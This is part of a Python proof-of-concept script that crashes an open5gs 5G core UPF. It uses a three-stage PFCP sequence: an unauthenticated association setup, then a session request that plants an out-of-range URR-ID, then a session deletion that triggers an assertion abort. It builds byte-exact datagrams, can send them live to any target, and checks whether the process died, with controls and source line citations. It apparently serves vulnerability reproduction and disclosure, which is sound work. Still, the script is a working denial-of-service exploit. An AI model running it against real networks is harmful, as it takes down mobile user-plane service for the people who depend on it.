# --------------------------------------------------------------------------- hexdump

def hexdump(data: bytes, prefix: str = "") -> str:
    out = []
    for i in range(0, len(data), 16):
        chunk = data[i:i + 16]
        hexs = " ".join(f"{b:02x}" for b in chunk)
        asc = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        out.append(f"{prefix}{i:04x}  {hexs:<47s}  |{asc}|")
    return "\n".join(out)


# --------------------------------------------------------------------------- driver

def run(args) -> int:
    istm = not args.no_istm if args.istm is None else args.istm

    urr_id = args.urr_id
    label = "DEFECT"
    if args.control == "urr-id-in-range":
        urr_id = 1
        istm = False
        label = "NEGATIVE CONTROL (must NOT crash)"
    elif args.control == "zero":
        urr_id = 0
        istm = False
        label = "POSITIVE CONTROL (also crashes: urr->id > 0 half of the assert)"

    in_range = 0 < urr_id <= OGS_MAX_NUM_OF_URR
    print(f"[A3-3] mode={label}")
    print(f"[A3-3] target={args.target}:{args.port} via={args.via} "
          f"urr_id={urr_id} (0x{urr_id & 0xffffffff:08x}) istm={istm}")
    print(f"[A3-3] URR-ID in validated range 1..{OGS_MAX_NUM_OF_URR}? {in_range}"
          f"   -> expect {'NO crash' if in_range else 'abort() at src/upf/context.c:735 (v2.8.0) / :838 (main)'}")

    cp_seid = args.cp_seid
    seq = args.seq

    # ---- Stage 1: self-enrol ------------------------------------------------
    m1 = build_association_setup(seq, args.local_ip)
    seq += 1
    # ---- Stage 2: plant -----------------------------------------------------
    if args.via == "establishment":
        m2 = build_session_establishment(seq, cp_seid, args.local_ip, urr_id, istm)
    else:
        m2 = build_session_modification(seq, args.up_seid, cp_seid, urr_id, istm,
                                        args.local_ip)
    seq += 1
    # ---- Stage 3: detonate --------------------------------------------------
    m3 = build_session_deletion(seq, args.up_seid)

    stages = [
        ("Stage 1  Association Setup Request   (self-enrol, no auth; src/upf/pfcp-sm.c:128-131)", m1),
        (f"Stage 2  Session {args.via.title()} Request  (plant URR-ID={urr_id}; "
         f"{'ACCEPTED' if not in_range else 'normal'})", m2),
        ("Stage 3  Session Deletion Request    (detonate; src/upf/n4-build.c:135 -> "
         "src/upf/context.c:735 at v2.8.0 / :838 at main)", m3),
    ]

    if args.via == "modification":
        print("[A3-3] NOTE: --via modification requires a real UP SEID.  Run once with "
              "--via establishment to learn it, then pass --up-seid.  "
              "(src/upf/n4-handler.c:322 -> :423 -> :507)")

    for name, pkt in stages:
        print(f"\n--- {name} ---")
        print(f"    {len(pkt)} bytes")
        print(hexdump(pkt, prefix="    "))

    if args.offline:
        print("\n[A3-3] --offline: no socket opened.  Datagrams above are byte-exact and "
              "can be replayed with any UDP sender.")
        return 0

    # ---- precondition: the UPF must be alive and speaking PFCP --------------
    alive, detail = probe_alive(args.target, args.port, args.local_ip,
                                timeout=args.timeout, seq=seq + 100,
                                source_port=args.source_port)
    print(f"[A3-3] pre-shot liveness : alive={alive}  ({detail})")
    if not alive:
        print(f"[A3-3] PRECONDITION FAILURE: {args.target}:{args.port} did not answer a "
              "PFCP Association Setup Request.")
        print("         Refusing to fire -- an unhealthy target cannot yield evidence.")
        return 2

    try:
        sock = open_pfcp_socket(args.source_port)
    except OSError as e:
        print(f"[A3-3] cannot bind source port {args.source_port}: {e}")
        return 2
    up_seid = args.up_seid
    del_seq = seq + 1
    del_answered = False
    del_cause = None
    # expected response type per stage
    want = [{MT_ASSOCIATION_SETUP_RESPONSE},
            {MT_SESSION_ESTABLISHMENT_RESPONSE, MT_SESSION_MODIFICATION_RESPONSE},
            {MT_SESSION_DELETION_RESPONSE}]
    try:
        for idx, (name, pkt) in enumerate(stages):
            if idx == 2 and up_seid:
                # re-encode stage 3 against the SEID learned from stage 2
                pkt = build_session_deletion(del_seq, up_seid)
            sock.sendto(pkt, (args.target, args.port))
            print(f"[A3-3] sent stage {idx + 1}: {len(pkt)} bytes")
            resp, seen, err = drain_until(sock, want[idx], args.timeout,
                                          peer=(args.target, args.port))
            if resp is None:
                print(f"[A3-3] stage {idx + 1}: NO type-{sorted(want[idx])} RESPONSE within "
                      f"{args.timeout}s (types seen: {seen}"
                      f"{', ' + str(err) if err else ''})")
                if idx == 2:
                    print("[A3-3]   (no Session Deletion Response -- consistent with the "
                          "UPF having aborted; the oracle below decides)")
                continue
            print(f"[A3-3] stage {idx + 1}: {len(resp)} bytes response "
                  f"(types seen while waiting: {seen})")
            print(hexdump(resp, prefix="    "))
            cause = parse_cause(resp)
            if cause is not None:
                print(f"[A3-3]   Cause = {cause} "
                      f"({'Request accepted' if cause == CAUSE_REQUEST_ACCEPTED else 'other'})")
            if idx == 1:
                learned = parse_seid_from_response(resp)
                if learned:
                    up_seid = learned
                    print(f"[A3-3]   learned UP F-SEID = 0x{up_seid:016x}")
                    # rebuild stage 3 against the learned SEID
                    stages[2] = (stages[2][0],
                                 build_session_deletion(del_seq, up_seid))
                else:
                    print("[A3-3]   !! could not learn the UP F-SEID -- stage 3 will target "
                          "SEID 0 and the UPF may ignore it")
            if idx == 2:
                del_answered = True
                del_cause = cause
    finally:
        sock.close()

    # ---- verdict: decided by the liveness oracle, not by request timeouts ----
    time.sleep(args.settle)
    alive, detail = probe_alive(args.target, args.port, args.local_ip,
                                timeout=args.timeout, seq=seq + 200,
                                source_port=args.source_port)
    print()
    print("=" * 74)
    print("RESULT")
    print(f"  stage-3 answered   : {del_answered}  (cause={del_cause})")
    print(f"  post-shot liveness : alive={alive}  ({detail})")

    if in_range:
        # NEGATIVE CONTROL: survival is the PASS condition.
        if alive and del_answered and del_cause == CAUSE_REQUEST_ACCEPTED:
            print("  VERDICT: CONTROL PASSED -- an in-range URR-ID is accepted, the UPF")
            print("           answers Session Deletion normally and stays alive.")
            print("           The message sequence is therefore benign; only the")
            print("           out-of-range URR-ID value aborts the process.")
            print("=" * 74)
            return 0
        print("  VERDICT: CONTROL FAILED -- the benign sequence did not complete.")
        print("           Do not trust a defect run until this passes.")
        print("=" * 74)
        return 3

    if not alive:
        print("  VERDICT: UPF NO LONGER ANSWERS PFCP ASSOCIATION SETUP / HEARTBEAT")
        print("  Expected log signature in the UPF container:")
        print("      upf: FATAL: upf_sess_urr_acc_fill_usage_report: Assertion "
              "`urr->id > 0 && urr->id <= OGS_MAX_NUM_OF_URR' failed.")
        print("      (src/upf/context.c:735 at v2.8.0 / :838 at main HEAD)")
        print("      ... followed by a backtrace and exit code 134 (SIGABRT).")
        print("=" * 74)
        return 0

    if del_answered and del_cause == CAUSE_REQUEST_ACCEPTED:
        print("  VERDICT: NOT REPRODUCED -- the UPF answered Session Deletion and is alive.")
        print("           Either the target is patched, or the URR was never installed")
        print("           (re-check the stage-2 Cause and the learned UP F-SEID above).")
        print("=" * 74)
        return 1

    print("  VERDICT: AMBIGUOUS -- the UPF still answers Heartbeat but stage 3 was not")
    print("           accepted.  Inspect the stage-2/stage-3 Causes above.")
    print("=" * 74)
    return 3



def main() -> int:
    p = argparse.ArgumentParser(
        description="open5gs UPF out-of-range PFCP URR-ID -> abort() (A3-3). "
                    "Defaults to --offline: emits byte-exact datagrams without sending.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--target", default="127.0.0.1", help="UPF N4 address (default 127.0.0.1)")
    p.add_argument("--port", type=int, default=8805, help="PFCP port (default 8805)")
    p.add_argument("--source-port", type=int, default=DEFAULT_PFCP_PORT,
                   help="local UDP port to bind (default 8805).  open5gs sends the "
                        "Association Setup Response to the peer's SERVICE port, not to "
                        "the ephemeral source port of the request -- see "
                        "open_pfcp_socket().")
    p.add_argument("--local-ip", default=None,
                   help="IPv4 advertised in our Node-ID / F-SEID.  Default: the source "
                        "address the OS would use to reach --target (auto-detected), "
                        "so that node_id and addr_list agree inside open5gs.")
    p.add_argument("--urr-id", type=lambda x: int(x, 0), default=0xFFFFFFFF,
                   help="URR-ID to install (default 0xFFFFFFFF, i.e. out of range)")
    p.add_argument("--cp-seid", type=lambda x: int(x, 0), default=0x1122334455667788,
                   help="CP F-SEID we advertise (default 0x1122334455667788)")
    p.add_argument("--up-seid", type=lambda x: int(x, 0), default=0,
                   help="UP F-SEID for the Deletion Request; auto-learned from the "
                        "Establishment Response when --via establishment")
    p.add_argument("--via", choices=["establishment", "modification"], default="establishment",
                   help="which planting path to use (default establishment).  "
                        "`modification` exercises src/upf/n4-handler.c:423/:507, "
                        "which D1 did not report.")
    p.add_argument("--istm", dest="istm", action="store_true", default=None,
                   help="set PERIODIC_REPORTING (ISTM) in Reporting Triggers -> also arms "
                        "D1's timer sink (main :1002 / v2.8.0 :881)")
    p.add_argument("--no-istm", dest="no_istm", action="store_true",
                   help="explicitly clear ISTM (default).  Proves the deletion sink does "
                        "NOT depend on the timer path.")
    p.add_argument("--control", choices=["none", "urr-id-in-range", "zero"], default="none",
                   help="DIFFERENTIAL CONTROL.  `urr-id-in-range` (URR-ID=1) must NOT crash "
                        "and proves the environment is healthy; `zero` is a positive "
                        "control (also crashes via the `urr->id > 0` half).")
    p.add_argument("--interleave-delay", type=float, default=0.05,
                   help="seconds between stages (default 0.05).  Stages are strictly "
                        "ordered so no race is needed; raise it if the UPF is slow.")
    p.add_argument("--seq", type=int, default=1, help="initial PFCP sequence number")
    p.add_argument("--timeout", type=float, default=3.0, help="response timeout seconds")
    p.add_argument("--settle", type=float, default=2.5,
                   help="seconds to wait after the last stage before re-probing "
                        "liveness (default 2.5)")
    p.add_argument("--heartbeat-only", action="store_true",
                   help="only run the PFCP Heartbeat liveness oracle and exit "
                        "(0 = UPF answered, 1 = it did not); nothing else is sent")
    p.add_argument("--offline", action="store_true", default=True,
                   help="(DEFAULT) do not send; emit byte-exact datagrams only")
    p.add_argument("--live", dest="offline", action="store_false",
                   help="actually send the datagrams to --target")
    args = p.parse_args()

    if args.local_ip is None:
        args.local_ip = default_local_ip(args.target)
        print(f"[A3-3] auto-detected --local-ip = {args.local_ip}")

    if args.heartbeat_only:
        alive, detail = probe_alive(args.target, args.port, args.local_ip,
                                    timeout=args.timeout,
                                    source_port=args.source_port)
        print(f"[A3-3] UPF PFCP liveness: alive={alive}  ({detail})")
        return 0 if alive else 1

    if args.istm is None:
        args.istm = False  # default: ISTM clear
    if args.no_istm:
        args.istm = False

    if not args.offline:
        print("[A3-3] *** LIVE MODE *** sending real UDP to "
              f"{args.target}:{args.port}.  Only run against a lab you own.")

    return run(args)


if __name__ == "__main__":
    sys.exit(main())
